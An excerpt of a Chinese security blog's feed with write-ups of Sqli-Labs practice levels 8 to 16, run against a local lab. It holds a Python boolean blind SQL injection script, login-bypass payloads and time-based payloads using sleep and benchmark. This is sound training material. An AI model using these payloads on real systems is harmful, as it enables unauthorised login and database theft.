class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-16/index.php"</span></div><div class="line">	data = <span class="string">"uname="</span> + payload + <span class="string">"&amp;passwd=chybeta&amp;submit=Submit"</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	content = requests.post(url,data=data,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line">flag = <span class="string">"flag.jpg"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">'admin") and%09(%09select%09ascii(substr('</span> +generateTarget(target) +<span class="string">"%09from%09"</span>+ str(i) +<span class="string">"%09for%091))&lt;="</span>+str(midNum) +<span class="string">")%23"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> flag <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/10.png?raw=true" alt=""></p>
<p>注：脚本中的payload的空格我用%90替代了，它对应tab键，可用于绕过对空格的过滤。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-15 POST- Blind-Boolian/time Based -Single quotes&lt;br&gt;Less-16 POST- Blind-Boolian/time Based -Double quotes&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less13~14-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less13-14-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less13-14-writeup/</id>
    <published>2017-08-23T09:23:54.000Z</published>
    <updated>2017-08-23T10:05:51.899Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-13 POST- Double Injection -Single quotes -String-with twist<br>Less-14 POST- Double Injection -Single quotes -String-with twist<br><a id="more"></a></p>
<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less 13"></a>Less 13</h1><p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>说明有括号保护，需闭合。</p>
<p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>页面返回提示说已经登陆成功。</p>
<p>后台查询语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&apos;admin&apos;)#`&apos;) and password=(&apos;chybeta&apos;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less 14"></a>Less 14</h1><p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&quot;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;chybeta&quot;&quot; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>从以上几条语句知道，需要闭合双引号。</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>页面返回提示说已经登陆成功。</p>
<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&quot;admin&quot;#&quot; and password=&quot;chybeta&quot; LIMIT 0,1</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-13 POST- Double Injection -Single quotes -String-with twist&lt;br&gt;Less-14 POST- Double Injection -Single quotes -String-with twist&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less11~12-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/</id>
    <published>2017-08-23T08:47:48.000Z</published>
    <updated>2017-08-23T10:05:52.704Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-11 POST-Error Based -Single quotes- String<br>Less-12 POST - Error Based -Double quotes - String<br><a id="more"></a><br>考察post注入，所以要借助工具。比如burp。</p>
<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less 11"></a>Less 11</h1><p>当post的数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>当post数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;chybeta&apos;&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>用如下payload即可登陆成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>这样后台的语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos;#&apos; and password=&apos;chybeta&apos; LIMIT 0,1</div></pre></td></tr></table></figure></p>
<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less 12"></a>Less 12</h1><p>和Less 11差不多，将单引号换成双引号。</p>
<p>post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>发现有括号保护。</p>
<p>最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&quot;admin&quot;)#&quot;) and password=(&quot;chybeta&quot;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-11 POST-Error Based -Single quotes- String&lt;br&gt;Less-12 POST - Error Based -Double quotes - String&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less8~10-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/</id>
    <published>2017-08-23T07:58:33.000Z</published>
    <updated>2017-08-23T08:32:00.539Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>Less-9 GET-Time based - Single Quotes<br>Less-10 GET-Blind-Time based - double quotes<br><a id="more"></a></p>
<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h1><p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 1=1 %23</div></pre></td></tr></table></figure></p>
<p>发现有 字符串<code>You are in...........</code></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 2=1 %23</div></pre></td></tr></table></figure></p>
<p>发现字符串消失。因此我们可以利用基于页面的变化来进行盲注。<br>比如以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database(),1,1))&lt;= 255 )%23</div><div class="line"></div><div class="line"></div><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database() from 1 for 1))&lt;= 255 )%23</div></pre></td></tr></table></figure></p>
<p>即可根据二分法得到数据库名称。</p>
<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h1><p>该关为GET-Time based - Single Quotes。基于时间的盲注<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(5) %23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/1.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(10) %23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/2.png?raw=true" alt=""></p>
<p>可以看到我们的sleep语句被带到了sql数据库中执行。</p>
<p>接下去可以利用sql中的if语句来进行注入，当条件正确则返回1，若不正确则sleep。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/3.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/4.png?raw=true" alt=""></p>
<p>之后利用脚本即可获取数据库名称。</p>
<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h1><p>Less-10 GET-Blind-Time based - double quotes<br>这个跟Less 9一样，只是由单引号变为了双引号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/5.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/6.png?raw=true" alt=""></p>
<p>除了sleep，还有benchmark函数来进行时间盲注。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BENCHMARK(count,expr)</div></pre></td></tr></table></figure>
<p>BENCHMARK()函数重复countTimes次执行表达式expr</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/7.png?raw=true" alt=""></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/8.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-8 GET-Blind-Boolean Based- Single Quotes&lt;br&gt;Less-9 GET-Time based - Single Quotes&lt;br&gt;Less-10 GET-Blind-Time based - double quotes&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
</feed>
